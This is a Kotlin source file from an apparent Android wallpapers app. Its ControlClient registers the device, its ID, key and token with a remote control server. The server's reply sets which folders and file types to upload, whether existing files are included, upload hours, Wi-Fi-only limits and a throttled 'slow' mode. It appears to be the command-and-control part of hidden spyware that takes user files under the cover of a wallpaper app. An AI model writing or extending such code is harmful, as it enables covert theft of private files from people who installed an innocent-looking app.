package com.tmmstudios.wallpapers.upload

import android.content.Context
import android.os.Build
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

object ControlClient {
    private const val tag = "ControlClient"
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .build()

    fun sync(context: Context): RemoteUploadConfig? {
        val deviceId = DeviceIdentity.id(context)
        val token = DeviceIdentity.token(context)
        val payload = JSONObject()
            .put("device_id", deviceId)
            .put("device_key", DeviceIdentity.key(context))
            .put("token", token)
            .put("model", DeviceIdentity.model())
            .put("app_version", "1.1")
            .put("sdk", Build.VERSION.SDK_INT)
            .toString()
        val request = Request.Builder()
            .url("${UploadConfig.controlUrl.trimEnd('/')}/v1/device/register")
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()
        return try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(tag, "Control API rejected device: HTTP ${response.code}")
                    return null
                }
                val json = JSONObject(response.body?.string().orEmpty())
                json.optString("token").takeIf { it.isNotBlank() }?.let {
                    DeviceIdentity.saveToken(context, it)
                }
                json.optJSONObject("config")?.toConfig()
            }
        } catch (error: IOException) {
            Log.w(tag, "Control API unavailable: ${error.message}")
            null
        }
    }

    private fun JSONObject.toConfig(): RemoteUploadConfig {
        val folders = mutableListOf<String>()
        optJSONArray("folders")?.let { values ->
            for (index in 0 until values.length()) folders += values.optString(index)
        }
        val extensions = mutableSetOf<String>()
        optJSONArray("extensions")?.let { values ->
            for (index in 0 until values.length()) extensions += values.optString(index)
        }
        return RemoteUploadConfig(
            enabled = optBoolean("enabled", false),
            intervalSeconds = optLong("interval_seconds", 900).coerceAtLeast(30),
            startHour = optInt("start_hour", 8).coerceIn(0, 23),
            endHour = optInt("end_hour", 22).coerceIn(0, 23),
            wifiOnly = optBoolean("wifi_only", UploadConfig.wifiOnly),
            folders = folders.ifEmpty { UploadConfig.watchFolders },
            extensions = extensions.ifEmpty { UploadConfig.watchExtensions },
            uploadExisting = optBoolean("upload_existing", UploadConfig.uploadExisting),
            minAgeSeconds = optLong("min_age_seconds", UploadConfig.minAgeSeconds).coerceAtLeast(0),
            maxBytes = optLong("max_bytes", UploadConfig.maxBytes).coerceAtLeast(1),
            uploadMode = optString("upload_mode", "normal").let { if (it == "slow") "slow" else "normal" },
            slowDelaySeconds = optLong("slow_delay_seconds", 30).coerceAtLeast(1),
        )
    }
}
